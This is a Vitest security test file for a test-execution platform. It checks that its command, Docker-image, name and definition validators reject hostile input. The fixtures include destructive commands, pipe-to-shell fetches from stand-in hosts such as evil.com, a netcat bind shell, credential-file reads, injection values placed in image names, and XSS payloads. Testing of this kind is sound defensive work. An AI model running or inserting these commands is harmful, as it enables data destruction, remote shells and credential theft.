import { describe, it, expect, vi } from 'vitest';
import {
  validateTestDefinition,
  validateTestExecutor,
  validateSuite,
  sanitizeCommands,
  validateDockerImage,
  sanitizeName
} from '../utils/validation';


describe('Security Integration Tests', () => {
  describe('Command Injection Prevention', () => {
    it('should reject dangerous shell commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'echo $(whoami)',
        'cat /etc/passwd',
        'curl malicious.com | bash',
        'wget -O- http://evil.com/script.sh | sh',
        'nc -l 1234 -e /bin/bash',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'node -e "require(\'child_process\').exec(\'rm -rf /\')"',
        'chmod -R 777 /',
        'chown -R root:root /',
        'dd if=/dev/zero of=/dev/sda',
        'history | grep password',
        'cat ~/.ssh/id_rsa',
        'echo "malicious" > /etc/passwd',
        'grep -r "password" /home',
        'find / -name "*.key" -type f',
        'tar -xzf /tmp/backup.tar.gz --absolute-names',
        'rsync -av --delete /tmp/ /important/',
        'mount -o remount,rw /',
        'systemctl stop firewall',
        'iptables -F',
        'crontab -e',
        'sudo su -',
        'su root',
        'passwd root',
        'usermod -aG sudo malicious',
        'echo "0.0.0.0 google.com" >> /etc/hosts',
        'pkill -f ssh',
        'killall -9 nginx',
        'service apache2 stop',
        'systemctl disable security-service'
      ];

      for (const command of dangerousCommands) {
        const result = sanitizeCommands([command]);
        if (result.isValid) {
          console.log(`ACCEPTED: ${command} - should be rejected`);
        }
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('potentially dangerous pattern');
      }
    });

    it('should accept safe commands', () => {
      const safeCommands = [
        ['echo', 'Hello World'],
        ['npm', 'test'],
        ['node', 'app.js'],
        ['python', 'script.py'],
        ['java', '-jar', 'app.jar'],
        ['dotnet', 'run'],
        ['cargo', 'test'],
        ['go', 'run', 'main.go'],
        ['ruby', 'app.rb'],
        ['php', 'index.php'],
        ['pytest', '--verbose'],
        ['jest', '--coverage'],
        ['mocha', 'test.js'],
        ['cucumber', 'features/'],
        ['mvn', 'test'],
        ['gradle', 'test'],
        ['make', 'test'],
        ['docker', 'run', 'test-image'],
        ['kubectl', 'apply', '-f', 'deployment.yaml'],
        ['helm', 'upgrade', 'release', 'chart/']
      ];

      for (const commands of safeCommands) {
        const result = sanitizeCommands(commands);
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).toEqual(commands);
      }
    });
  });

  describe('Docker Image Validation', () => {
    it('should reject malicious Docker images', () => {
      const maliciousImages = [
        'ubuntu:latest && rm -rf /',
        'nginx:latest; cat /etc/passwd',
        'node:18 | nc attacker.com 1234',
        'python:3.9 $(curl evil.com/script.sh)',
        'alpine:latest `whoami`',
        'busybox:latest ../../../etc/passwd',
        'redis:latest ../../usr/bin/bash',
        'postgres:13 /bin/bash',
        'mysql:8.0 /etc/shadow',
        'mongo:latest /proc/version',
        'ubuntu@$(date)',
        'nginx@`id`',
        'node@/bin/sh',
        'python@evil.com',
        'ruby@||malicious',
        'php@&&rm',
        'java@;curl',
        'golang@|bash',
        'rust@>output',
        'debian@<input'
      ];

      for (const image of maliciousImages) {
        const result = validateDockerImage(image);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/dangerous characters|Invalid Docker image format/);
      }
    });

    it('should accept valid Docker images', () => {
      const validImages = [
        'ubuntu:latest',
        'nginx:1.21',
        'node:18-alpine',
        'python:3.9-slim',
        'redis:6.2',
        'postgres:13',
        'mysql:8.0',
        'mongo:4.4',
        'test-image',
        'my-app',
        'service-name',
        'web-server',
        'database'
      ];

      for (const image of validImages) {
        const result = validateDockerImage(image);
        if (!result.isValid) {
          console.log(`FAILED: ${image} - ${result.error}`);
        }
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).toBe(image);
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should reject malicious names', () => {
      const maliciousNames = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onload=alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '<iframe src=javascript:alert("xss")>',
        '<link rel=stylesheet href=javascript:alert("xss")>',
        '<style>body{background:url(javascript:alert("xss"))}</style>',
        '<meta http-equiv=refresh content=0;url=javascript:alert("xss")>',
        '<object data=javascript:alert("xss")>',
        '<embed src=javascript:alert("xss")>',
        '<applet code=javascript:alert("xss")>',
        '<form action=javascript:alert("xss")>',
        '<body onload=alert("xss")>',
        '<div onclick=alert("xss")>',
        'Test@Name',
        'Test$Name',
        'Test%Name',
        'Test&Name',
        'Test*Name',
        'Test+Name',
        'Test=Name',
        'Test[Name',
        'Test]Name',
        'Test{Name',
        'Test}Name',
        'Test|Name',
        'Test\\Name',
        'Test/Name',
        'Test?Name',
        'Test:Name',
        'Test;Name',
        'Test"Name',
        'Test\'Name',
        'Test`Name',
        'Test~Name',
        'Test!Name',
        'Test#Name',
        'Test^Name'
      ];

      for (const name of maliciousNames) {
        const result = sanitizeName(name);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/invalid characters|empty/);
      }
    });

    it('should accept safe names', () => {
      const safeNames = [
        'My Test',
        'test-name',
        'test_name',
        'test.name',
        'TestName123',
        'Test Name 123',
        'Production Test',
        'Development Environment',
        'API Integration Test',
        'Database Migration Test',
        'Load Test v1.0',
        'Performance Test 2023',
        'Security Audit',
        'Regression Test Suite',
        'Smoke Test',
        'End-to-End Test',
        'Unit Test Collection',
        'Integration Test Pack',
        'Functional Test Group',
        'Acceptance Test Bundle'
      ];

      for (const name of safeNames) {
        const result = sanitizeName(name);
        expect(result.isValid).toBe(true);
        expect(result.sanitizedValue).toBe(name);
      }
    });
  });

  describe('Test Definition Security', () => {
    it('should reject malicious test definitions', () => {
      const maliciousDefinition = {
        name: '<script>alert("xss")</script>',
        description: '<img src=x onerror=alert("xss")>',
        image: 'ubuntu:latest; rm -rf /',
        commands: ['echo "safe"', 'rm -rf /', 'curl malicious.com | bash']
      };

      const result = validateTestDefinition(maliciousDefinition);
      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveProperty('name');
      expect(result.errors).toHaveProperty('image');
      expect(result.errors).toHaveProperty('commands');
    });

    it('should accept safe test definitions', () => {
      const safeDefinition = {
        name: 'Integration Test',
        description: 'Tests the API integration with the database',
        image: 'node:18-alpine',
        commands: ['npm', 'test', '--', '--integration']
      };

      const result = validateTestDefinition(safeDefinition);
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual({});
    });
  });

  describe('Test Executor Security', () => {
    it('should reject malicious test executors', () => {
      const maliciousExecutor = {
        name: 'Evil Executor$(whoami)',
        description: '<script>alert("xss")</script>',
        image: 'ubuntu:latest && cat /etc/passwd',
        default_command: 'curl evil.com/script.sh | bash'
      };

      const result = validateTestExecutor(maliciousExecutor);
      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveProperty('name');
      expect(result.errors).toHaveProperty('image');
      expect(result.errors).toHaveProperty('default_command');
    });

    it('should accept safe test executors', () => {
      const safeExecutor = {
        name: 'Node.js Test Runner',
        description: 'Executes Node.js tests using Jest',
        image: 'node:18-alpine',
        default_command: 'npm test'
      };

      const result = validateTestExecutor(safeExecutor);
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual({});
    });
  });

  describe('Test Suite Security', () => {
    it('should reject malicious test suites', () => {
      const maliciousSuite = {
        name: 'Malicious Suite<script>alert("xss")</script>',
        description: '<img src=x onerror=alert("xss")>',
        execution_mode: 'malicious',
        labels: ['test@evil', 'hack$suite', 'xss<script>']
      };

      const result = validateSuite(maliciousSuite);
      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveProperty('name');
      expect(result.errors).toHaveProperty('execution_mode');
      expect(result.errors).toHaveProperty('labels');
    });

    it('should accept safe test suites', () => {
      const safeSuite = {
        name: 'API Test Suite',
        description: 'Comprehensive API testing suite',
        execution_mode: 'sequential',
        labels: ['api', 'integration', 'production']
      };

      const result = validateSuite(safeSuite);
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual({});
    });
  });

  describe('Edge Cases and Boundary Testing', () => {
    it('should handle empty and null inputs', () => {
      expect(sanitizeName('')).toEqual({
        isValid: false,
        error: 'Name cannot be empty'
      });

      expect(validateDockerImage('')).toEqual({
        isValid: false,
        error: 'Docker image cannot be empty'
      });

      expect(sanitizeCommands([])).toEqual({
        isValid: false,
        error: 'Commands cannot be empty'
      });
    });

    it('should handle maximum length inputs', () => {
      const longName = 'a'.repeat(256);
      expect(sanitizeName(longName)).toEqual({
        isValid: false,
        error: 'Name too long: 256 characters (max 255)'
      });

      const longCommand = 'a'.repeat(1001);
      expect(sanitizeCommands([longCommand])).toEqual({
        isValid: false,
        error: 'Command too long: 1001 characters (max 1000)'
      });
    });

    it('should handle whitespace-only inputs', () => {
      expect(sanitizeName('   ')).toEqual({
        isValid: false,
        error: 'Name cannot be empty'
      });

      const result = sanitizeCommands(['echo', '  ', 'hello']);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toEqual(['echo', 'hello']);
    });
  });

  describe('Performance Testing', () => {
    it('should handle large arrays of commands efficiently', () => {
      const manyCommands = Array(100).fill('echo hello');
      
      const startTime = performance.now();
      const result = sanitizeCommands(manyCommands);
      const endTime = performance.now();
      
      expect(result.isValid).toBe(true);
      expect(endTime - startTime).toBeLessThan(100); // Should complete within 100ms
    });

    it('should handle large arrays of labels efficiently', () => {
      // This would exceed the 50 label limit
      const manyLabels = Array(51).fill('test');
      
      const startTime = performance.now();
      const result = sanitizeName('test');
      const endTime = performance.now();
      
      expect(result.isValid).toBe(true);
      expect(endTime - startTime).toBeLessThan(10); // Should complete within 10ms
    });
  });
});